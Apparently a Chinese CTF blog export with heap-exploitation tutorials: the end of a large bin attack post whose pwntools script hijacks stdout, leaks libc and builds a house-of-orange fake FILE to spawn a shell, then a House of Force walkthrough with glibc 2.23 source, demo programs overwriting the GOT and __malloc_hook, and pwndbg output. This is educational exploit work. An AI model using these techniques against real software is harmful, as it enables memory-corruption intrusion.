<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br></pre></td></tr></table></figure>

<p>覆盖率写在chunk0的libc地址的低字节，使flags字段位于addr1-&gt;fd，错位覆盖的方法使_IO_write_base的最低一字节为<code>\x00</code>，而我们的堆地址偏移设置的正好为<code>~880</code>（满足了hijack stdout的两个条件），通过那一位的爆破（或者重复运行exp）使chunk0-&gt;bk指向stdout就可以实现hijack stdout</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<h5 id="地址计算"><a href="#地址计算" class="headerlink" title="地址计算"></a>地址计算</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br></pre></td></tr></table></figure>

<h5 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h5><p>利用house_of_orange来get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="新版largebin-attack"><a href="#新版largebin-attack" class="headerlink" title="新版largebin_attack"></a>新版largebin_attack</h2><p><a href="https://blog.csdn.net/yjh_fnu_ltn/article/details/141569981?spm=1001.2014.3001.5502">Large Bin Attack 源码调试</a></p>
<h2 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h2><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件（ctf-wiki）：</p>
<ul>
<li>可以修改一个 large bin chunk 的 data</li>
<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
<li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li>
<li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106699487">ha1vk</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>有用的东西</title>
    <url>/2025/04/15/%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">[pwn]调试：gdb+pwndbg食用指南</a></p>
]]></content>
  </entry>
  <entry>
    <title>Top chunk attack</title>
    <url>/2025/04/09/top%20chunk%20atttack/</url>
    <content><![CDATA[<h1 id="了解-Top-chunk"><a href="#了解-Top-chunk" class="headerlink" title="了解 Top chunk"></a>了解 Top chunk</h1><p>这是top chunk分配的源码（glibc2.23 malloc.c 3790行左右）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//*</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//*</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>从glibc里的malloc源代码里也可以看到top chunk的切割过程，在bins里没有合适chunk的情况下，如果top chunk的size大于请求的size + MINSIZE，就可以从top chunk里进行切割。</p>
<p>如果top chunk不够分割，则调用sysmalloc进行内存分配，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进sysmalloc()</p>
<p>首先，它会检测申请的内存是否大于mmap的分配阈值，如果大于则用mmap进行分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">    <span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>否则扩充 top chunk 以便从中切割</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">old_heap = heap_for_ptr (old_top);</span><br><span class="line">old_heap_size = old_heap-&gt;size;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">    &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    set_head (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">              | PREV_INUSE);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br></pre></td></tr></table></figure>

<p>如果不满足top chunk扩充的条件的话，old_top_chunk会被free掉，向系统批发新的top_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">    heap-&gt;ar_ptr = av;</span><br><span class="line">    heap-&gt;prev = old_heap;</span><br><span class="line">    av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">    arena_mem += heap-&gt;size;</span><br><span class="line">    <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">    top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">    set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">       MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">    <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">       become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">       up, too, although the chunk is marked in use. */</span></span><br><span class="line">    old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= MINSIZE)<span class="comment">//*</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">        set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">        _int_free (av, old_top, <span class="number">1</span>);<span class="comment">//*</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br></pre></td></tr></table></figure>

<h1 id="从源码分析top-chunk-attack"><a href="#从源码分析top-chunk-attack" class="headerlink" title="从源码分析top chunk attack"></a>从源码分析top chunk attack</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#libc-2.23中malloc源码第3793-3809行</span></span><br><span class="line">	  victim = av-&gt;top;<span class="comment">//获取当前top_chunk</span></span><br><span class="line">      size = chunksize (victim);<span class="comment">//计算top_chunk的大小</span></span><br><span class="line">	 <span class="comment">// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;<span class="comment">//top_chunk指针更新</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">chunk_at_offset (victim, nb)的宏定义（代码第<span class="number">1312</span><span class="number">-1313</span>行）</span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);<span class="comment">//更新top_chunk_size</span></span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这是_int_malloc()源码中调用top chunk的部分，注意到<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>在进行比较时用的是unsigned long。如果程序存存在溢出等漏洞可以将top chunk的size修改，就可以得到漏洞利用。例如将size修改为-1(0xffffffffffffffff)，那么这将使得从top chunk地址开始后所有的内存都被包含在了top chunk里，可以被自由切割。</p>
<p>而且呢top chunk的位置移动仅进行了地址的位移（即地址的加减运算）</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><h2 id="向前控制内存demo1"><a href="#向前控制内存demo1" class="headerlink" title="向前控制内存demo1"></a>向前控制内存demo1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o demo1 demo1.c  ubuntu 16.04</span></span><br></pre></td></tr></table></figure>

<p>在执行过第7行后，top_chunk的size被修改，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0xffffffffffffffff &lt;== top_chunk size = -1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过malloc(-4120)，为什么时-4120?</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/ctf/pwn/demo1:</span><br><span class="line">GOT protection: Partial RELRO | Found 2 GOT entries passing the filter</span><br><span class="line">[0x601018] __libc_start_main@GLIBC_2.2.5 -&gt; 0x7ffff7a2d750 (__libc_start_main) ◂— push r14</span><br><span class="line">[0x601020] malloc@GLIBC_2.2.5 -&gt; 0x7ffff7a91180 (malloc) ◂— push rbp</span><br><span class="line">pwndbg&gt; distance 0x602020 0x601010</span><br><span class="line">0x602020-&gt;0x601010 is -0x1010 bytes (-0x202 words)</span><br><span class="line">pwndbg&gt; p  -0x1010</span><br><span class="line"><span class="variable">$1</span> = -4112 </span><br></pre></td></tr></table></figure>

<p> 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址。</p>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移 -4112</p>
<p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了<strong>无符号整数</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br></pre></td></tr></table></figure>

<p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p>
<p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x601010,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x601010</span><br><span class="line">Size: 0x1009</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x601010</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000001009 &lt;== top_chunk</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个0x1009 可以按源码算出来： (-1) - ((-4120) + 0x10) &#x3D; 0x1009</p>
<p>remainder_size &#x3D; size - nb; size &#x3D; -1; nb &#x3D; (unsigned long)(requst_size) + (pre_size + size); 其中-1和-4120被转化为unsigned long</p>
</blockquote>
<p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>执行过malloc(0x10)，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x601000</span><br><span class="line">0x601000:       0x0000000000600e28      0x00007ffff7ffe168</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000000021 &lt;== malloc(0x10)得到的</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000fe9 &lt;== top_chunk</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="向后控制内存demo2"><a href="#向后控制内存demo2" class="headerlink" title="向后控制内存demo2"></a>向后控制内存demo2</h2><p>在上一个示例中，我们演示了如何修改 <code>top_chunk</code> 使得 <code>top_chunk</code> 指针减小来修改其上面（低地址）的 <code>got</code> 表中的内容。同样，利用这种方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== 修改top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== 增大top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x401000 r-xp     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x600000           0x601000 r--p     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x601000           0x602000 rw-p     1000   1000 /home/ctf/pwn/demo2</span><br><span class="line">          0x602000           0x623000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000      0 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000      0 [anon_7ffff7dd3]</span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000      0 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fec000     0x7ffff7fef000 rw-p     3000      0 [anon_7ffff7fec]</span><br><span class="line">    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure>

<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056 </code>经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<p>执行过malloc(140737345551056);</p>
<p>通过 <code>p main_arena</code>或<code>top_chunk</code>等来查看top_chunk的位置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x7ffff7dd1b10</span><br><span class="line">Size: 0xffff800008830509</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x7ffff7dd1b10</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000      0xffff800008830509</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

